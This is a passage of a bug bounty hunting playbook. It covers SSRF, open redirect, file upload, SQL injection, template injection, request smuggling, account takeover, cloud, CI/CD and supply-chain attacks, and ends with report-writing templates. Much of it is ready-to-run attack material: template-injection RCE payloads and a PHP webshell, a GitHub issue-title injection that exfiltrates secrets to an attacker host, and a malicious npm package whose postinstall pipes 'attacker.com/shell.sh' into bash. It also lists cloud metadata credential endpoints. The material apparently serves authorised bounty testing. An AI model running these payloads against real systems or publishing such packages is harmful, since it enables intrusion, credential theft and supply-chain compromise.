curl -s "https://api.guerrillamail.com/ajax.php?f=get_email_address" | jq -r '.email_addr'
# Check inbox
curl -s "https://api.guerrillamail.com/ajax.php?f=check_email&seq=0" | jq '.list[] | "\(.mail_from): \(.mail_subject)"'
```

**Temporary Phone Numbers (for SMS verification):**
| Service | Notes |
|---------|-------|
| [SMSPool](https://smspool.net) | Paid, reliable, API, 100+ countries |
| [5SIM](https://5sim.net) | Paid, per-activation pricing, wide coverage |
| [TextVerified](https://textverified.com) | US numbers, per-verification pricing |
| [Quackr](https://quackr.io) | Free temporary numbers, limited availability |
| [ReceiveSMS](https://receivesms.co) | Free, public numbers, low reliability |
| [SMSTome](https://smstome.com) | Free, multiple countries, public inboxes |

**Workflow:**
```bash
# 1. Create Account A with disposable email
#    → Use Guerrilla Mail or Mailinator address
#    → Complete email verification
#    → If SMS required, use SMSPool or Quackr

# 2. Create Account B same way (different disposable address)

# 3. Login as A, populate account with data (orders, bookings, profile)

# 4. Login as B, replay A's requests using B's session:
curl -X GET "https://TARGET/api/v1/orders/ACCOUNT_A_ORDER_ID" \
  -H "Authorization: Bearer ACCOUNT_B_TOKEN"

# 5. If you can see A's data from B's session → IDOR confirmed
```

**Account creation tips:**
- Use `+` aliases on Gmail if the target doesn't block them: `you+accountA@gmail.com`, `you+accountB@gmail.com` — both deliver to the same inbox but look like different emails to most services
- Some programs detect disposable email domains — have a backup Gmail/Outlook ready
- For programs requiring phone + email, SMSPool is most reliable for the phone half
- Save all account credentials in your session notes — you'll need them when writing the PoC

## SSRF — Server-Side Request Forgery

### SSRF IP Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302→169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (RCE on cloud)
- Docker API accessible = Critical (direct RCE)

### Cloud Metadata Endpoints
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP (needs Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure (needs Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## OAuth / OIDC
- [ ] Missing `state` parameter → CSRF
- [ ] `redirect_uri` accepts wildcards → ATO
- [ ] Missing PKCE → code theft
- [ ] Implicit flow → token leakage in referrer
- [ ] Open redirect in post-auth redirect → OAuth token theft chain

### Open Redirect Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |

## File Upload Bypass Table

| Bypass | Technique |
|--------|-----------|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

## Race Conditions
- [ ] Coupon codes / promo codes — can same code be used multiple times?
- [ ] Gift card redemption — concurrent redemptions
- [ ] Fund transfer / withdrawal — double-spend check-then-deduct
- [ ] Voting / rating limits — race past the rate limit
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder — Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## XSS — Cross-Site Scripting

### XSS Sinks (grep for these)
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass → Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain

## Business Logic
- [ ] Negative quantities in cart
- [ ] Price parameter tampering
- [ ] Workflow skip (e.g., pay without checkout)
- [ ] Role escalation via registration fields
- [ ] Privilege persistence after downgrade

## SQL Injection

### Detection
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; SELECT 1/0--    -- divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
```

## GraphQL
- [ ] Introspection: `{ __schema { types { name fields { name type { name } } } } }`
- [ ] Missing field-level auth: `{ node(id: "base64encoded") { ... on User { email ssn } } }`
- [ ] Batching attack (rate limit bypass): send 100 login attempts in one JSON array
- [ ] Alias-based brute: send same query with 100 aliases

### GraphQL — H100 Exploited Patterns

**Pattern 1: Missing field-level auth → Mass PII (HackerOne #489146, #792927, #2032716)**
```graphql
# Introspection — find sensitive types
{ __schema { types { name fields { name type { name } } } } }

# Query private user data without auth
{ node(id: "base64(UserType:123)") { ... on User { email name } } }

# Email enumeration via mutation
mutation { SaveCollaboratorsMutation(input: {report_id: "1", usernames: ["victim"]}) { user { email } } }
```

**Pattern 2: GraphQL batching → Rate limit bypass**
```json
[
  {"query": "mutation { login(email:\"a@test.com\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"a@test.com\",password:\"pass2\") { token } }"},
  ... (1000 copies)
]
```

**Pattern 3: Alias-based brute force**
```graphql
query {
  a1: login(email: "user@test.com", password: "pass1") { token }
  a2: login(email: "user@test.com", password: "pass2") { token }
  a3: login(email: "user@test.com", password: "pass3") { token }
  # ... 100 aliases in single query
}
```

**Pattern 4: Report data leak via GraphQL (HackerOne platform itself)**
```graphql
# Leak private program details
{ PolicyPageAssetGroupsIndex(id: "gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/123") { ... } }

# Leak report attributes
{ report(id: 123) { title vulnerability_information created_at } }
```

## Cache Poisoning / Web Cache Deception
- [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` — unkeyed headers reflected in response
- [ ] Parameter cloaking (`?param=value;poison=xss`)
- [ ] Fat GET (body params on GET requests)
- [ ] Web cache deception (`/account/settings.css` — trick cache into storing private response)

## HTTP Request Smuggling
- [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- [ ] H2.CL: HTTP/2 downgrade smuggling
- [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix

### CL.TE Example
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Frontend reads Content-Length: 13 → sends all. Backend reads Transfer-Encoding → sees chunk "0" = end → "SMUGGLED" left in buffer → next user's request poisoned.

### HTTP Smuggling → Mass Session Hijack (H100 Pattern)

All 4 smuggling reports in the Top 100 used the same chain: desync → redirect → cookie theft.

**Target selection:**
- Subdomains with "b" suffix: slackb.com, admin-official.line.me (often less hardened)
- Endpoints behind CDN/reverse proxy (Akamai, Cloudflare, nginx)
- Login/authentication endpoints that issue session cookies on redirect

**The PoC pattern (Slack #737140):**
```
1. CL.TE desync on slackb.com
2. Smuggled request forces victim into GET https:// HTTP/1.1
3. Backend responds with 301 redirect to https://
4. Victim's browser follows redirect WITH Slack d cookie
5. Redirect target = Burp Collaborator
6. Collect session cookies from Collaborator
7. Impersonate any Slack user
```

**Testing checklist:**
- [ ] Send request with both Content-Length and Transfer-Encoding headers
- [ ] Use Burp Repeater "Send group in sequence" to test desync
- [ ] Monitor Burp Collaborator for incoming requests from other IPs
- [ ] Check if response timing differs between smuggled vs normal requests
- [ ] Test on subdomains, not just main domain

### Cache Poisoning → Stored XSS on Sensitive Pages (H100 Pattern)

PayPal's two reports (#488147 + #510152) proved this chain pays $18-20K.

**Attack flow:**
```
1. Identify unkeyed header reflected in response
   - X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
   - Test: send request with header=evil.com, check if response changes
2. Check if response is cached (Cache-Control, CDN headers, X-Cache)
3. Poison cache with XSS payload in the unkeyed header
4. Wait for victim to visit the same URL → served poisoned cached copy
5. XSS executes in victim's browser on the sensitive page
```

**CSP Bypass patterns (from PayPal):**
- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
- 'unsafe-eval' in CSP + jQuery = direct script execution
- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains

**High-value targets for cache poisoning:**
- Login pages (paypal.com/signin) — tokens, credentials in context
- Dashboard/admin pages — session tokens, user data
- Payment/checkout pages — financial data
- Settings/profile pages — PII, API keys

## Android / Mobile Hunting
- [ ] Certificate pinning bypass (Frida/objection)
- [ ] Exported activities/receivers (AndroidManifest.xml)
- [ ] Deep link injection
- [ ] Shared preferences / SQLite in cleartext
- [ ] WebView JavaScript bridge
- [ ] Mobile API often uses older/different API version than web

### Console / Desktop Client Hunting (H100 Pattern — Valve, PlayStation)

**4 reports in Top 100 targeted game/desktop clients for RCE:**

**Valve #470520: RCE via buffer overflow in Server Info**
- Game clients parse server info responses
- Crafted server info packet → buffer overflow → arbitrary code execution
- No auth required — victim just joins a game server

**PlayStation #873614: Websites Can Run Arbitrary Code on PS Now**
- Browser-based app has access to system-level APIs
- Malicious website → JavaScript execution → system command access
- Attack vector: shared links, in-game web views

**PlayStation #826026: Use-After-Free in IPV6_2292PKTOPTIONS**
- Kernel-level vulnerability in network stack
- Malformed IPv6 packet → UAF → arbitrary kernel read/write
- Fully pre-auth, no user interaction beyond network

**Testing checklist for client-side:**
- [ ] Download client app (APK, IPA, .exe, .dmg)
- [ ] Extract and analyze: `strings`, `nm`, `otool -L`
- [ ] Check for hardcoded endpoints, API keys, debug flags
- [ ] Fuzz custom protocol parsers (server info, chat, matchmaking)
- [ ] Test deep links / URI schemes for injection
- [ ] Check if app exposes local server/API without auth
- [ ] Test WebView JavaScript bridges
- [ ] Look for deserialization of untrusted data (config files, server responses)

## SSTI — Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          → 49 = Jinja2 / Twig / generic
${7*7}           → 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako / some Ruby
*{7*7}           → 49 = Spring (Thymeleaf)
{{7*'7'}}        → 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### SSTI → RCE Payloads
```python
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
```php
# Twig (PHP/Symfony)
{{["id"]|filter("system")}}
```
```
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
```ruby
# ERB (Ruby on Rails)
<%= `id` %>
```

## LLM / AI Features (OWASP ASI01-ASI10)

| ID | Vuln Class | What to Test |
|----|-----------|-------------|
| ASI01 | Prompt injection | Override system prompt via user input |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts |
| ASI04 | Privilege escalation | Use AI to access admin-only tools |
| ASI05 | Indirect injection | Poison document/URL the AI processes |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation |
| ASI07 | Model DoS | Craft inputs causing infinite loops or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in output |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.

## Subdomain Takeover

```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME"
# Look for: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  → GitHub Pages
"NoSuchBucket"                          → AWS S3
"No such app"                           → Heroku
"404 Web Site not found"                → Azure App Service
```

## ATO — Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX → ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources → token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
If token < 16 hex chars or numeric only → brute-forceable.

### Path 4: Token Not Expiring / Reuse
Request token → wait 2 hours → use it → still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required → attacker changes email → locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login → note Set-Cookie session=XYZ → Log in → does session ID change? If not = fixation.

### Path 8: Email Confirmation Bypass → SSO Takeover (H100 — Shopify #791775, #796808, #910300)

This exact pattern was reported 3 times against Shopify. The fix was incomplete each time.

**Attack flow:**
```
1. Create trial account with your-controlled email (attacker@test.com)
2. Go to profile → change email to victim@company.com
3. Shopify sends confirmation link to YOUR email (not victim's)
   - Bug: confirmation goes to the "current" email, not the "new" email
4. Click confirmation link → your account now has victim's email confirmed
5. Use Shopify SSO: your account = victim's email across all stores
6. Set master password via SSO → take over all stores using that email
```

**How to test this on any platform:**
- [ ] Create account with email A
- [ ] Change email to email B (victim)
- [ ] Where does confirmation link go? A or B?
- [ ] If it goes to A → email confirmation bypass
- [ ] Check if SSO/OAuth links accounts by email
- [ ] Can you set password for accounts that used OAuth-only login?

### Path 9: OAuth Account Linking Abuse (H100 — Uber #202781)

**Attack flow:**
```
1. Attacker initiates OAuth flow with victim's email
2. OAuth provider sends code to victim (if they have access)
3. OR: Attacker already has OAuth account linked to victim's email
4. Exchange code for token → link to attacker's primary account
5. Now attacker has victim's OAuth data on their account
```

## Cloud / Infra Misconfigs

```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# S3 name brute
for name in target target-backup target-assets target-prod; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"

# Exposed admin panels
# /jenkins /grafana /kibana /swagger-ui /phpMyAdmin /.env /actuator/env
```

### Infrastructure Hunting — H100 Pattern ($10-25K per finding)

Snapchat's 3 infrastructure reports averaged $13.3K each.

**Exposed CI/CD (Snapchat #231460 — $15K, #313457 — $0)**
```bash
# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
curl -s "https://jenkins.target.com/script" # Script console

# CircleCI
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'

# GitLab CI
curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'

# Check for open build systems
for sub in jenkins ci build buildkite travis drone; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done
```

**Exposed Grafana (Snapchat #663628 — $10K)**
```bash
curl -s "https://grafana.target.com/api/search" | jq '.[].title'
curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'
# Grafana dashboards often contain: DB queries, internal URLs, API keys, credentials
```

**Exposed Kubernetes API (Snapchat #455645 — $25K)**
```bash
curl -sk "https://target.com:6443/api/v1/namespaces"
curl -sk "https://target.com:6443/api/v1/pods"
curl -sk "https://target.com:6443/api/v1/secrets"
# If 200 → you're in. No auth = full cluster access.
```

**Exposed Spring Actuators (LY Corp #170532 — $18K)**
```bash
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key"))'
curl -s "https://target.com/actuator/heapdump" -o heapdump
# Analyze heapdump for secrets: jhat heapdump or Eclipse MAT
```

## CI/CD Pipeline — GitHub Actions Security

### Recon: Finding Workflow Files
```bash
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint:
sisakulint scan .github/workflows/
```

### Category 1: Code Injection & Expression Safety (CICD-SEC-04)
**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.commits.*.message / .author.name
github.event.head_commit.message
github.head_ref
```

- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow

### Category 2: Pipeline Poisoning & Untrusted Checkout
- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
- [ ] **TOCTOU** — label-gated approval + mutable ref
- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow
- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
- [ ] **ArtiPACKED** — `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts

### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)
- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
- [ ] **Impostor commit** — fork network allows pushing commits that appear to belong to upstream
- [ ] **Ref confusion** — ambiguous tag/branch names exploited
- [ ] **Known vulnerable actions** — check against GHSA database

### Category 4: Credential & Secret Protection
- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials
- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
- [ ] **Hardcoded credentials** — API keys, passwords directly in workflow YAML

### Category 5: Triggers & Access Control (CICD-SEC-01)
- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`
- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable
- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure

### Category 6: AI Agent Security (2025+)
- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"`
- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context
- [ ] **Prompt injection via workflow context** — event data interpolated into AI agent prompt

### Expression Injection PoC Template

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### Real-World GHSAs (Proven Payouts)

| GHSA | Action | Bug Class | Severity |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain — impostor commit | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |

### CI/CD A→B Chains
```
Expression injection → secret exfiltration → cloud account takeover
Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
Artifact poisoning → release binary tampering → supply chain compromise
Cache poisoning → build output manipulation → backdoored deployment
Impostor commit → pinned action hijack → all downstream repos affected
OIDC token theft → cloud metadata → S3/GCS read → customer data
Self-hosted runner → container escape → internal network pivot
```

## Supply Chain Hunting (H100 — PayPal #925585 $30K, LY Corp #1043385 $11.5K)

npm/Gem/PyPI supply chain attacks paid $11-30K in the Top 100.

### How to Find Vulnerable Targets

```bash
# 1. Find target's package dependencies
# Check package.json, Gemfile, requirements.txt, go.mod in public repos
gh api -X GET "search/code?q=org:TARGET+filename:package.json" --jq '.items[].repository.full_name' | sort -u

# 2. Extract package names
cat package.json | jq -r '.dependencies | keys[]' 2>/dev/null
cat package.json | jq -r '.devDependencies | keys[]' 2>/dev/null

# 3. Check if packages exist on public registry
for pkg in $(cat package.json | jq -r '.dependencies | keys[]'); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  echo "$pkg: $status"
done

# 4. If 404 → package name is available → you can register it
npm publish  # with malicious postinstall script
```

### Malicious Package Template

```json
// package.json
{
  "name": "target-internal-package-name",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://attacker.com/shell.sh | bash"
  }
}
```

### Also Check:
- **Ruby gems:** `gem search TARGET --remote` — check for unpublished internal gem names
- **Python packages:** `pip search TARGET` or check requirements.txt
- **Go modules:** Check go.mod for private module paths
- **Docker base images:** Check if target publishes to Docker Hub with stale base images
- **GitHub Actions:** Check if target uses unpinned actions (mutable tags → impostor commits)

---

# PHASE 4: VALIDATE

## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO → STOP. See also `references/supervisor.md` for detailed triage flow.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request → KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it → KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

## 4 Pre-Submission Gates (from supervisor.md)

### Gate 0: Reality Check (30 seconds)
```
[ ] The bug is real — confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope — checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### Gate 1: Impact Validation (2 minutes)
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### Gate 2: Deduplication Check (5 minutes)
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### Gate 3: Report Quality (10 minutes)
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```

## CVSS 3.1 Quick Guide

| Score | Severity | Typical Bug |
|-------|----------|-------------|
| 0-3.9 | Low | Info disclosure (non-sensitive) |
| 4-6.9 | Medium | IDOR (read PII), Stored XSS (low impact) |
| 7-8.9 | High | IDOR (write/delete), SQLi, Race (double spend) |
| 9-10 | Critical | Auth bypass → admin, SSRF (cloud metadata), RCE |

---

# PHASE 5: REPORT

## Canonical Report Format

Every report MUST follow this exact structure. No exceptions.

```
# <Target> Vulnerability Report
## <Descriptive Vulnerability Name>
**Severity:** <Critical | High | Medium | Low>
**Vulnerability Type:** <Primary type> / <Secondary type if applicable>
**Affected Component:** <Component name> (`<path or endpoint>`)
---
## Summary
<3–5 sentences. Covers: what the vulnerability is, where it lives, how it is triggered, and what an attacker gains. No hedging. Present tense.>

---
## Root Cause
### 1. <Root cause label>
- <Tight bullet — one clause each>
- <No prose paragraphs>

---
## Attack Flow
1. <One-line step — actor + action>
2. <One-line step>

---
## Proof of Concept (PoC)
### Step 1: <Short action label>
<sentence describing what this step demonstrates.>
[Screenshot or code block]

---
## Security Impact
An attacker with <access level> can:
- <Concrete impact bullet>
- <Concrete impact bullet>

---
## Realistic Attack Chain
1. <Step>
2. <Final impact>
```

### Format Rules (non-negotiable)
- **Zero fluff.** Every sentence must carry technical weight.
- **No hedging.** Never write "may", "could potentially", "it is possible that". If the code allows it, state it as fact.
- **Present tense throughout.**
- **H1** for the report title. **H2** for all top-level sections.
- **`---`** as divider after metadata strip and between major sections.
- No tables. No collapsible sections. No emoji.
- PoC steps: numbered, one-line action header (H3), one sentence of context, then screenshot or code block.

### Platform Adaptations

| Platform | Additional requirement |
|----------|----------------------|
| `h1` | Append CVSS 3.1 vector string as code block if `--cvss` |
| `immunefi` | Add **Asset Type**, **Blockchain/Tech Stack**, **Vulnerability Category** |
| `bugcrowd` | Use Bugcrowd severity labels (P1/P2/P3/P4) alongside plain label |
| `intigriti` | Add **Impact** tag field to metadata strip |

## Report Title Formula
```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```
**Good:** `IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data`
**Bad:** `IDOR vulnerability found`

## Impact Statement Formula
```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```

## Human Tone Rules (Avoid AI-Sounding Writing)
- Start sentences with the impact, not the vulnerability name
- Write like you're explaining to a smart developer, not a textbook
- Use "I" and active voice: "I found that..." not "A vulnerability was discovered..."
- One concrete example beats three abstract sentences
- No em dashes, no "comprehensive/leverage/seamless/ensure"

## The 60-Second Pre-Submit Checklist
```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```

## Severity Escalation Language
| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number — I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact — attacker can steal [X]" |

---

